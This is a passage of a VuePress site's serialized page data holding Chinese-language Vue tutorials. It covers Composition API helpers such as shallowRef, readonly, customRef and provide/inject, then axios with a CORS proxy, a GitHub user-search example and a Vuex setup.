已经“链接”起来了\nstate.foo++\nconsole.log(foo.value) // 2\n\nfoo.value++\nconsole.log(state.foo) // 3\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 自定义hook\n\n自定义hook在react中非常常见，vue3中初次使用会比较陌生，但其实很简单，看下面这个例子。\n\nimport { reactive, onmounted, onunmounted } from 'vue';\n// 自定义hook，点击时获取坐标\nexport const usepoint = () => {\n    const point = reactive({\n        x: 0,\n        y: 0\n    });\n    const savepoint = (e) => {\n        point.x = e.pagex;\n        point.y = e.pagey;\n        console.log('point:', point.x, point.y);\n    }\n    onmounted(() => {\n        window.addeventlistener('click', savepoint);\n    });\n    onunmounted(() => {\n        window.removeeventlistener('click', savepoint);\n    });\n    // 最后返回有效数据\n    return point;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n<template>\n  <div>\n    <span>{{point.x}}, {{point.y}}</span>\n  </div>\n</template>\n\n<script setup>\nimport { ref, watcheffect } from 'vue'\nimport { usepoint } from './hook.js'\n// 使用自定义钩子\nconst point = usepoint();\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 其他composition api\n\n\n# shallowreactive()和shallowref()\n\nshallow的意思是“浅的”，shallowreactive()和shallowref()会生成浅响应式数据。对于shallowreactive()，它的“浅”表示只让reactive对象的第一层属性具有响应式。\n\n<template>\n  <div>\n    <span>person: {{person.name}} - {{person.age}} - {{person.mother.name}} - {{person.mother.age}}</span> || \n    <button type=\"button\" @click=\"handleclick1\">点我1</button> || \n    <button type=\"button\" @click=\"handleclick2\">点我2</button>\n  </div>\n</template>\n\n<script setup>\nimport { shallowreactive } from 'vue'\n\nconst person = shallowreactive({\n  name: '张三',\n  age: 18,\n  mother: {name:'李梅',age: 42}\n})\nconst handleclick1 = () => { person.age++; } // 页面正常更新\nconst handleclick2 = () => { person.mother.age++; } // 页面没反应\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n对于shallowref()，它的“浅”表示只让ref对象的value本身这个值具有响应式。基本类型的场景，.value就是基本类型的值（数值、布尔值、字符串）；而复杂类型场景，.value是一个指向对象的地址值，指向的这个对象并不是proxy类型，也就是说.value它指向的对象不再具有响应式。\n\n<template>\n  <div>\n    <span>person: {{person.name}} - {{person.age}} - {{person.mother.name}} - {{person.mother.age}}</span> || \n    <button type=\"button\" @click=\"handleclick1\">点我1</button> || \n    <button type=\"button\" @click=\"handleclick2\">点我2</button>\n  </div>\n</template>\n\n<script setup>\nimport { shallowref } from 'vue'\n\nconst person = shallowref({\n  name: '张三',\n  age: 18,\n  mother: {name:'李梅',age: 42}\n})\nconst handleclick1 = () => { person.value.age++; } // 修改对象里面的某些属性，页面没反应\nconst handleclick2 = () => {\n  // 将value指向的对象完全替换成新的，页面响应了\n  person.value = {\n    name: '李四',\n    age: 19,\n    mother: {name:'王雪',age: 39}\n  }; \n}\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n最后说一下，shallowref()，ref对象的.value一直是一个值，可以是基本类型数据的值，也可以是一个对象的地址值，只要修改值那就是响应式的，如果是修改.value指向的对象里的某些属性那就不会响应。修改对象地址值就是替换一个新对象，这与修改对象的某些属性并不一样，也就是“浅”的表现之处。shallowref()与ref()的区别就是.value指向的对象一个是普通对象类型，另一个是proxy类型的。\n\n\n# readonly()和shallowreadonly()\n\nreadonly()返回原始对象的只读代理，这个原始对象可以是普通对象、ref对象或reactive对象。不允许修改对象里的属性值。而shallowreadonly()是只限制对象第一层属性不允许被修改，其他深层次的是可以被修改的。经常用于做数据隔离，如果强制修改会在控制台还有警告提示，比如拖拽表格并且表格里有input等输入表单项。\n\nconst original = reactive({ count: 0 })\n\nconst copy = readonly(original)\n\nwatcheffect(() => {\n  // 用于响应性追踪\n  console.log(copy.count)\n})\n\n// 变更 original 会触发依赖于副本的侦听器\noriginal.count++\n\n// 变更副本将失败并导致警告\ncopy.count++ // 警告!\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# toraw()和markraw()\n\ntoraw()返回reactive()或readonly()代理的原始对象。请谨慎使用toraw()，它直接操作原始对象，虽然在一定程度上避开了“响应”，但意外修改它可能会引起bug。\n\nconst foo = {}\nconst reactivefoo = reactive(foo)\nconsole.log(toraw(reactivefoo) === foo) // true\n\n\n1\n2\n3\n\n\nmarkraw()标记一个对象，使其永远不会转换为 proxy（不会被用于响应式），最后返回对象本身。markraw()常用于标记一些第三方类库引用对象，或者用于不可变数据的大列表，也就说一些对象是没必要进行响应式proxy处理的，可防止开发人员意外设置它们为响应式。\n\nconst foo = markraw({})\n// isreactive()：检查对象是否是由reactive()创建的响应式数据\nconsole.log(isreactive(reactive(foo))) // false\n\n// 嵌套在其他响应式对象中\nconst bar = reactive({ foo })\nconsole.log(isreactive(bar.foo)) // false\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# customref()\n\ncustomref()用于创建一个自定义的ref对象，可以在ref.value设置值（setter）和读取值（getter）时加入自定义逻辑。customref()的入参是一个函数，该函数有两个形参，第一个形参track在getter内部用于“放行”（其实是添加effect），第二形参trigger在setter内部用于“放行”（其实是触发effect），函数返回一个对象，该对象有get和set属性（getter和setter）。一个延迟显示的例子如下：\n\n<template>\n  <div>\n    <input v-model=\"inputvalue\" /><span>{{delayshow}}</span>\n  </div>\n</template>\n\n<script setup>\nimport { ref, watcheffect } from 'vue'\n\n// 输入框里的值\nconst inputvalue = ref(0);\n\n// 输入框后面的span展示值，要求是隔一秒再更新，这个防抖函数可以封装成一个自定义hook\nconst delayshow = usedebouncedref(inputvalue.value, 1000)\n\nwatcheffect(() => {\n  delayshow.value = inputvalue.value;\n});\n<\/script>\n\n<script>\nimport { customref } from 'vue'\n// 自定义hook\nfunction usedebouncedref(value, delay = 200) {\n  let timeout\n  return customref((track, trigger) => {\n    return {\n      get() {\n        track()\n        return value\n      },\n      set(newvalue) {\n        cleartimeout(timeout)\n        timeout = settimeout(() => {\n          value = newvalue\n          trigger()\n        }, delay)\n      }\n    }\n  })\n}\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n\n# triggerref()\n\n手动执行与shallowref关联的任何作用 (effect)。\n\nconst shallow = shallowref({\n  greet: 'hello, world'\n})\n\n// 第一次运行时记录一次 \"hello, world\"\nwatcheffect(() => {\n  console.log(shallow.value.greet)\n})\n\n// 这不会触发作用 (effect)，因为 ref 是浅层的\nshallow.value.greet = 'hello, universe'\n\n// 记录 \"hello, universe\"，意思是会执行watcheffect里的回调函数\ntriggerref(shallow)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# provide()和inject()\n\n和vue2的provide/inject功效差不多，可以传响应式数据并且数据更安全了，比如可以用readonly()对数据进行限制（或者shallowref等）。\n\n<template>\n  <mymarker />\n</template>\n\n<script setup>\nimport { ref, reactive, readonly, provide } from 'vue'\nimport mymarker from './mymarker.vue'\nconst location = ref('north pole')\nconst geolocation = reactive({\n  longitude: 90,\n  latitude: 135\n})\n// 修改location的方法\nconst updatelocation = () => {\n  location.value = 'south pole'\n}\n// 将孙组件想要的location和geolocation传递过去，传递是我们用readonly做\n// 限制，不允许直接修改数据源，只允许使用传递的updatelocation方法进行修改\nprovide('location', readonly(location))\nprovide('geolocation', readonly(geolocation))\nprovide('updatelocation', updatelocation)\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n<template>\n    <div>\n        <div>location: {{userlocation}}</div>\n        <div>longitude: {{usergeolocation.longitude}}</div>\n        <div>latitude: {{usergeolocation.latitude}}</div>\n        <button @click=\"updateuserlocation\">点我</button>\n    </div>\n</template>\n\n<script>\nimport { inject } from 'vue'\n\nexport default {\n  setup() {\n    // 接收祖先节点的provide，第二个参数是默认值\n    const userlocation = inject('location', 'the universe')\n    const usergeolocation = inject('geolocation')\n    const updateuserlocation = inject('updatelocation')\n\n    return {\n      userlocation,\n      usergeolocation,\n      updateuserlocation\n    }\n  }\n}\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# isref、isreactive、isreadonly、isproxy、unref\n\n响应式数据判断：\n\n * isref()：检查一个值是否是一个ref对象。\n * isreactive()：检查一个对象是否由reactive()创建的代理。\n * isreadonly()：检查一个对象是否由readonly()创建的只读代理。\n * isproxy()：检查一个对象是否由reactive或者readonly创建的代理。\n * unref()：是val = isref(val) ? val.value : val的语法糖函数。unref中的r确实是小写。",charsets:{cjk:!0}},{title:"3.Vue周边",frontmatter:{title:"3.Vue周边"},regularPath:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0Vue/3.vue%E5%91%A8%E8%BE%B9.html",relativePath:"book-web/web前端js框架/学习Vue/3.vue周边.md",key:"v-6d85c096",path:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0Vue/3.vue%E5%91%A8%E8%BE%B9.html",headers:[{level:2,title:"一、Vue中的ajax",slug:"一、vue中的ajax",normalizedTitle:"一、vue中的ajax",charIndex:12},{level:3,title:"1.1 使用axios并解决跨域",slug:"_1-1-使用axios并解决跨域",normalizedTitle:"1.1 使用axios并解决跨域",charIndex:28},{level:3,title:"1.2 用户搜索案例",slug:"_1-2-用户搜索案例",normalizedTitle:"1.2 用户搜索案例",charIndex:3044},{level:3,title:"1.3 Vue Resource",slug:"_1-3-vue-resource",normalizedTitle:"1.3 vue resource",charIndex:7369},{level:2,title:"二、Vuex",slug:"二、vuex",normalizedTitle:"二、vuex",charIndex:7822},{level:3,title:"2.1 Vuex介绍",slug:"_2-1-vuex介绍",normalizedTitle:"2.1 vuex介绍",charIndex:7833},{level:3,title:"2.2 搭建Vuex环境",slug:"_2-2-搭建vuex环境",normalizedTitle:"2.2 搭建vuex环境",charIndex:8897},{level:3,title:"2.3 Vuex的基本使用",slug:"_2-3-vuex的基本使用",normalizedTitle:"2.3 vuex的基本使用",charIndex:9866},{level:3,title:"2.4 getters",slug:"_2-4-getters",normalizedTitle:"2.4 getters",charIndex:13873},{level:3,title:"2.5 辅助函数——快速生成属性和方法",slug:"_2-5-辅助函数-快速生成属性和方法",normalizedTitle:"2.5 辅助函数——快速生成属性和方法",charIndex:15262},{level:3,title:"2.6 Vuex模块化",slug:"_2-6-vuex模块化",normalizedTitle:"2.6 vuex模块化",charIndex:20644},{level:2,title:"三、Vue Router",slug:"三、vue-router",normalizedTitle:"三、vue router",charIndex:30445},{level:3,title:"3.1 搭建Vue Router环境",slug:"_3-1-搭建vue-router环境",normalizedTitle:"3.1 搭建vue router环境",charIndex:30857},{level:3,title:"3.2 Router的基本使用",slug:"_3-2-router的基本使用",normalizedTitle:"3.2 router的基本使用",charIndex:31852},{level:3,title:"3.3 嵌套路由和query传参",slug:"_3-3-嵌套路由和query传参",normalizedTitle:"3.3 嵌套路由和query传参",charIndex:36303},{level:3,title:"3.4 命名路由和params传参",slug:"_3-4-命名路由和params传参",normalizedTitle:"3.4 命名路由和params传参",charIndex:42566},{level:3,title:"3.5 路由的props传参",slug:"_3-5-路由的props传参",normalizedTitle:"3.5 路由的props传参",charIndex:47460},{level:3,title:"3.6 编程式的导航",slug:"_3-6-编程式的导航",normalizedTitle:"3.6 编程式的导航",charIndex:50381},{level:3,title:"3.7 缓存路由组件",slug:"_3-7-缓存路由组件",normalizedTitle:"3.7 缓存路由组件",charIndex:54302},{level:3,title:"3.8 两个新的生命钩子",slug:"_3-8-两个新的生命钩子",normalizedTitle:"3.8 两个新的生命钩子",charIndex:56024},{level:3,title:"3.9 路由守卫",slug:"_3-9-路由守卫",normalizedTitle:"3.9 路由守卫",charIndex:57685},{level:3,title:"3.10 history模式和hash模式",slug:"_3-10-history模式和hash模式",normalizedTitle:"3.10 history模式和hash模式",charIndex:66841}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"一、Vue中的ajax 1.1 使用axios并解决跨域 1.2 用户搜索案例 1.3 Vue Resource 二、Vuex 2.1 Vuex介绍 2.2 搭建Vuex环境 2.3 Vuex的基本使用 2.4 getters 2.5 辅助函数——快速生成属性和方法 2.6 Vuex模块化 三、Vue Router 3.1 搭建Vue Router环境 3.2 Router的基本使用 3.3 嵌套路由和query传参 3.4 命名路由和params传参 3.5 路由的props传参 3.6 编程式的导航 3.7 缓存路由组件 3.8 两个新的生命钩子 3.9 路由守卫 3.10 history模式和hash模式",content:'# Vue周边\n\n\n# 一、Vue中的ajax\n\n\n# 1.1 使用axios并解决跨域\n\n前端ajax技术大多是基于XMLHttpRequest的（这一节的ajax以及跨域可以看之前的文章），我们这一节要使用的axios就是对XMLHttpRequest进行了封装。使用npm i axios来局部安装它，然后使用import axios from "axios"引入到组件中，最后使用它来发送HTTP请求，来请求已经部署在本地5000端口的后端项目。\n\n<template>\n  <div class="student">\n    <h3>姓名：{{ name }}</h3>\n    <h3>年龄：{{ age }}</h3>\n    <button @click.stop="getStudentInfo">获取学生信息</button>\n  </div>\n</template>\n\n<script>\nimport axios from "axios";\nexport default {\n  name: "Student",\n  data() {\n    return {\n      name: "张三",\n      age: 18,\n    };\n  },\n  methods: {\n    getStudentInfo() {\n      // 使用axios进行HTTP请求\n      axios.get("http://localhost:5000/students").then(\n        (response) => {\n          console.log("响应数据", response.data);\n        },\n        (error) => {\n          console.log("请求失败", error.message);\n        }\n      );\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n在页面点击发现浏览器控制台报has been blocked by CORS policy这样的错误，这是因为本Vue前端项目部署在http://localhost:8080/，而请求的后端接口是http://localhost:5000/students，同域名同协议但不同端口号了，这是跨域问题。\n\n我们知道axios的底层XMLHttpRequest是支持CORS这个跨域解决方案的，并且在使用axios时是自动为我们设置了请求头里的Origin字段，但是我们现在部署在本地的后端项目没有处理响应头的Access-Control-Allow-Origin字段，也就是说前端支持CORS但后端项目还暂不支持CORS。可以看下面我截取的部分request请求头和response响应头。\n\n// 请求头部信息，有Origin\nAccept: application/json, text/plain, */*\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: keep-alive\nHost: localhost:5000\nOrigin: http://localhost:8080\nReferer: http://localhost:8080/\n\n// 响应头部信息，没有Access-Control-Allow-Origin\nConnection: keep-alive\nContent-Length: 110\nContent-Type: application/json; charset=utf-8\nDate: Fri, 17 Sep 2021 19:29:25 GMT\nETag: W/"6e-wHidWjXg0dVzHrIzAITIYLJBAfc"\nX-Powered-By: Express\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n解决这个问题的方法：要么修改后端代码去设置响应头部的Access-Control-Allow-Origin，要么给前端配一个代理服务器进行请求的转发。这里我们就选择使用Vue Cli给我们提供的代理服务器。打开前端项目根目录下的vue.config.js，在里面写上如下配置，保存好后重启项目。\n\nmodule.exports = {\n    // 开启代理服务器，proxy的值就是服务器地址，也就是请求转发地址\n    devServer: {\n        proxy: \'http://localhost:5000\'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n配置好代理服务器后，项目中使用axios的地方，请求的地址的端口必须换成8080，也就是将http://localhost:5000/students改为http://localhost:8080/students，这是因为现在代理服务器处于和本前端项目部署端口一致都是8080。最后，在页面点击按钮，就能正常获取到接口返回的数据了。\n\n上面这种配置代理的方式会有两个限制，一是不能配置多个代理；二是，因为代理服务器与本项目部署使用端口号一样，那请求资源时其实会先从本项目的public下寻找资源，找不到才会去被代理地址寻找资源。其实Vue Cli还有另外一种代理服务器的配置。\n\nmodule.exports = {\n    // 开启代理服务器\n    devServer: {\n        proxy: {\n            \'api\': {\n                target: \'http://localhost:5000\',\n                pathRewrite: { \'^/api\': \'\' },\n            },\n            \'/myApi\': {\n                target: \'http://localhost:5000\', // 请求转发地址\n                pathRewrite: { \'^/myApi\': \'\' }, // 匹配\'/myApi\'开头的请求地址，将\'/myApi\'替换为\'\'\n                // ws: true, // 是否支持WebSocket\n                // changeOrigin // 是否让请求头的host与服务器地址保持一致\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n这种代理服务器配置方式可以配置多个代理服务器，然后因为它可以是有接口名前缀，是用于区分前端public里的资源还是后端资源，但在前端项目进行请求时中记得加上这些前缀，比如http://localhost:8080/myApi/students。\n\n\n# 1.2 用户搜索案例\n\n我们使用axios去请求一个GitHub提供的公共接口，它返回一个用户列表信息。我们需要制作两个组件，一个搜索区域，一个展示列表区域（为了演示没有将item拆出来）。然后还要给它制作一个简单提示，例如“欢迎来到xxx”、“正在加载中”、“请求错误”等。\n\n父组件App.vue：\n\n<template>\n  <div><HubSearch /><HubUserList /></div>\n</template>\n\n<script>\nimport HubSearch from "./components/HubSearch.vue";\nimport HubUserList from "./components/HubUserList.vue";\nexport default {\n  name: "App",\n  components: { HubUserList, HubSearch },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n搜索区域HubSearch.vue：\n\n<template>\n  <div class="search-outer">\n    <h3 class="search-input">Search Github Users</h3>\n    <div>\n      <input\n        type="text"\n        placeholder="enter the name you search"\n        v-model="keyWord"\n      />&nbsp;<button @click="getUserList">Search</button>\n    </div>\n  </div>\n</template>\n\n<script>\nimport axios from "axios";\nexport default {\n  name: "HubSearch",\n  // keyWord是输入框里的内容，isFirst是否第一次使用\n  data() {\n    return {\n      keyWord: "",\n      isFirst: true,\n    };\n  },\n  methods: {\n    getUserList() {\n      // 输入框没有内容就返回\n      if (!this.keyWord) return;\n      // 只第一次才去触发changeNoFirst事件，后面无需再管理isFirst\n      if (this.isFirst) {\n        this.isFirst = false;\n        // 通知HubUserList组件，开始搜索了，把欢迎页面撤掉\n        this.$bus.$emit("changeNoFirst", this.isFirst);\n      }\n      // 通知HubUserList组件，用户点了搜索，页面换成“正在加载”\n      this.$bus.$emit("requestLoading", true);\n      // 使用axios进行接口请求\n      axios.get(`https://api.github.com/search/users?q=${this.keyWord}`).then(\n        (response) => {\n          console.log("请求成功：", response);\n          if (response.data != null) {\n            // 通知HubUserList组件，将用户信息传给它，并且把“正在加载”撤掉换成用户列表页面\n            this.$bus.$emit("getUserInfo", response.data);\n          }\n        },\n        (error) => {\n          console.log("请求失败：", error);\n          if (error && error.message) {\n            // 通知HubUserList组件，将错误信息传给它，并且把“正在加载”撤掉换成错误展示页面\n            this.$bus.$emit("requestFailed", error.message);\n          }\n        }\n      );\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n用户列表展示区域HubUserList.vue：\n\n<template>\n  <div class="row">\n    <h1 v-if="isFirst">欢迎使用！</h1>\n    <div v-if="!isFirst">\n      <h1 v-show="errorMsg">搜索失败，错误信息是：{{ errorMsg }}</h1>\n      <h1 v-show="isLoading">正在加载...</h1>\n      <div\n        class="card"\n        v-show="!isLoading"\n        v-for="userItem in userList"\n        :key="userItem.login"\n      >\n        <a :href="userItem.html_url" target="_blank">\n          <img :src="userItem.avatar_url" style="width: 100px" />\n        </a>\n        <p class="card-text">{{ userItem.login }}</p>\n      </div>\n    </div>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "HubUserList",\n  data() {\n    return {\n      isFirst: true,\n      isLoading: false,\n      errorMsg: "",\n      userList: [],\n    };\n  },\n  mounted() {\n    // 接收HubSearch组件的通知，用户开始搜索，撤掉欢迎页面\n    this.$bus.$on("changeNoFirst", (bool) => {\n      this.isFirst = bool;\n    });\n    // 接收HubSearch组件的通知，用户列表信息拿到了，撤掉“正在加载”页面，换上信息列表页面\n    this.$bus.$on("getUserInfo", (userInfo) => {\n      if (userInfo) {\n        // 正在加载状态更改为加载完毕\n        this.isLoading = false;\n        // 校验，然后再保存信息\n        if (userInfo.items && userInfo.items.length)\n          this.userList = userInfo.items;\n      }\n    });\n    // 接收HubSearch组件的通知，用户开始搜索，换上“正在加载”页面\n    this.$bus.$on("requestLoading", (bool) => {\n      this.isLoading = bool;\n      // 上一的请求可能发生过，这次开始请求就将错误信息清空\n      if (this.errorMsg) this.errorMsg = "";\n    });\n    // 接收HubSearch组件的通知，请求出错，撤掉“正在加载”换上错误展示信息页面\n    this.$bus.$on("requestFailed", (errorMsg) => {\n      if (errorMsg) {\n        this.errorMsg = errorMsg;\n        // 请求完成了，虽然发生了错误，加正在加载状态改为加载完毕\n        this.isLoading = false;\n      }\n    });\n  },\n};\n<\/script>\n\n<style scoped>\n.card {\n  float: left;\n  width: 33.333%;\n  padding: 0.75rem;\n  margin-bottom: 2rem;\n  border: 1px solid #efefef;\n  text-align: center;\n}\n\n.card > img {\n  margin-bottom: 0.75rem;\n  border-radius: 100px;\n}\n\n.card-text {\n  font-size: 85%;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n\n\n\n# 1.3 Vue Resource\n\nVue Resource也是对XHR进行了封装，但它在Vue1.0版本用得比较多，在工作中可能还会遇到这种技术，所以简单了解一下。使用npm i vue-resource进行局部安装，然后在main.js中引入它，再使用插件的形式将他增加到Vue原型上：\n\nimport Vue from \'vue\'\nimport App from \'./App.vue\'\nimport vueResource from \'vue-resource\'\n\nVue.use(vueResource);\n\nnew Vue({\n  el: \'#app\',\n  render: h => h(App),\n  components: {\n    App\n  },\n  beforeCreate() {\n    Vue.prototype.$bus = this;\n  }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n后续的使用同axios\n\n\n# 二、Vuex\n\n\n# 2.1 Vuex介绍\n\nVuex是一个插件，在项目中用Vue.use(xxx)添加到Vue上。Vuex的作用是，集中管理多个组件的共享状态（共用数据），它适用于任意组件间的通信。\n\n那么Vuex与自定义事件的使用场景区别：\n\n * 只涉及个别组件，比如只有一对父子组件之间要进行简单的通信，就可以使用自定义事件。\n * 涉及的组件稍多点，比如一个父组件多个子组件，那就可以使用全局事件总线。\n * 涉及的组件多并且层级复杂，那么使用Vuex会比较合适。\n\n上面第三点关于全局事件总线不适用的详细说明：\n一旦通信的组件多而且组件间的层级很复杂时，共享数据的读取会非常的不方便。共享数据的读取，第一种方式是使用props传参，第二种方式用得少，组件各自存相同的数据，谁的数据变化了谁就使用$emit通知对方也同时更新。这两种方式在刚刚那个条件下都有缺点：第一种方式的缺点是会产生多层的porps传递，比如爷组件传给孙组件，就要经过父组件，可能父组件都没有实质性地用到该数据；第二种方式的缺点就是数据各自维护，表面是数据共享，实质只是数据相同，所以全局事件总线基本上都是用props进行共享数据的读取。\n\n而Vuex应对这种场景就非常擅长了，它会将组件共享数据提取出来放在一起进行集中式管理，也会将修改数据的方法提取出来放在一起集中式管理，所以你不管是读还是改都会非常的方便。所谓集中式管理，就是把以前的“事件回调函数”从它们原本的组件中抽离出来，也就是不写在组件内部了，同样的，共享数据的定义也不在组件内部定义了，也全部抽离出来。放在哪？下面的Vuex工作原理图会接着说。\n\nVuex工作原理图：\n\n\n\n * Store：图中的虚线框是Vuex，它其实有个隐藏着的Store，Vuex在我们项目中具现化的就是这个Store，它实际管理着State、Mutation和Action。\n * State：它是Vuex中的唯一数据源，存储并集中管理着多个组件的共享数据（状态）。\n * Mutation：它存放并集中管理着修改State数据的方法。这里的“方法”，与全局事件总线中的回调函数非常类似，都用于修改共享数据。\n * Action：它存放并集中管理着含有异步操作的方法，Mutation里存的只能是同步的方法。所以Action里的方法可以用来请求接口、设置定时器等。\n\n在提取业务代码时，可以将独特的逻辑留在组件了，把大部分公共业务逻辑代码放到Action里，Mutation只放最最公共的业务逻辑或者简单的数据修改。\n\n\n# 2.2 搭建Vuex环境\n\n先使用npm i vuex在项目中局部安装Vuex，然后在项目根目录下新建store目录，并在该目录下新建index.js文件。用于存放store相关代码，也是用于集中管理State里的数据、Mutation里的方法以及Action里的方法。\n\nimport Vue from \'vue\';\nimport Vuex from \'vuex\';\n/*\n  必须在Vuex.Store实例化之前将Vuex功能添加到Vue里，否则会报\n  `[vuex] must call Vue.use(Vuex) before creating a store instance.`\n  原因是Vuex.Store的内部用到了经过Vue.use(Vuex)增强后的Vue。\n*/\nVue.use(Vuex)\n\n// 虽然Vuex功能添加进来了，但它还需要具象化，也就是需要对Vuex.Store进行实例化\n// 实例化同时，为state、mutations、actions开辟空间，便于集中管理\nexport default new Vuex.Store({\n  state: { // 开辟空间，集中管理共享数据\n\n  },\n  actions: { // 开辟空间，集中管理异步方法\n\n  },\n  mutations: {// 开辟空间，集中管理同步方法\n\n  }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n将导出的Store实例放在Vue配置对象的名为store属性上，是为了让每个组件都能使用store。main.js代码如下：\n\nimport Vue from \'vue\'\nimport App3 from \'./App3.vue\'\nimport store from \'./store/index\'\n\nnew Vue({\n  el: \'#app\',\n  render: h => h(App3),\n  // 在这里放入Store实例，那么每个组件里都能使用`this.$store`访问了\n  store,\n  components: { App3 },\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 2.3 Vuex的基本使用\n\n我们先准备一个基础版的Count组件，有各种求和功能，代码如下。\n\n<template>\n  <div>\n    <h2>当前和为：{{ sum }}</h2>\n    <select v-model.number="num">\n      <option value="1">1</option>\n      <option value="2">2</option>\n      <option value="3">3</option>\n    </select>\n    <button @click="increment">加{{ num }}</button>\n    <button @click="decrement">减{{ num }}</button>\n    <button @click="incrementOdd">当前和为奇数时再加{{ num }}</button>\n    <button @click="incrementWait">等一等再加{{ num }}</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Count",\n  data() {\n    return {\n      num: 1,\n      sum: 0,\n    };\n  },\n  methods: {\n    increment() {\n      this.sum += this.num;\n    },\n    decrement() {\n      this.sum -= this.num;\n    },\n    incrementOdd() {\n      if (this.sum % 2 === 0) return;\n      this.sum += this.num;\n    },\n    incrementWait() {\n      setTimeout(() => {\n        this.sum += this.num;\n      }, 1000);\n    },\n  },\n};\n<\/script>\n\n<style>\nbutton {\n  margin-left: 5px;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n\n\n我们需要将sum提取到state里，然后将各种求和的方法提取到actions和mutations里。尽量把公共的复杂的业务逻辑和异步操作放到actions里，把最最公共的业务逻辑和最简单的state数据变更放到mutations里。\n\nindex.js：\n\nimport Vue from \'vue\';\nimport Vuex from \'vuex\';\nimport { addWait, addOdd } from \'./actions-types\';\nimport { COUNT_ADD, COUNT_SUBTRACT } from "./mutation-types";\n\nVue.use(Vuex)\n\nexport default new Vuex.Store({\n    state: { sum: 0 },\n    actions: {\n        // 异步方法，context具有store大部分属性和方法，value是提供的相关新数据\n        [addWait](context, value) {\n            setTimeout(() => {\n                context.commit(COUNT_ADD, value);\n            }, 1000)\n        },\n        // 公共的复杂的业务逻辑放到actions里。简单数据变更就放到mutations里\n        [addOdd]({ state, commit }, value) {\n            if (state.sum % 2) commit(COUNT_ADD, value);\n        }\n    },\n    mutations: {\n        // state就是共享数据，value是提供的相关新数据\n        [COUNT_ADD](state, value) {\n            state.sum += value; // 只是简单的数据变更，如果有复杂的逻辑就抽到actions里\n        },\n        // state就是共享数据，value是提供的相关新数据\n        [COUNT_SUBTRACT](state, value) {\n            state.sum -= value;\n        },\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n使用store过后的Count.vue：\n\n<template>\n  <div>\n    \x3c!-- 使用共享数据sum --\x3e\n    <h2>当前和为：{{ $store.state.sum 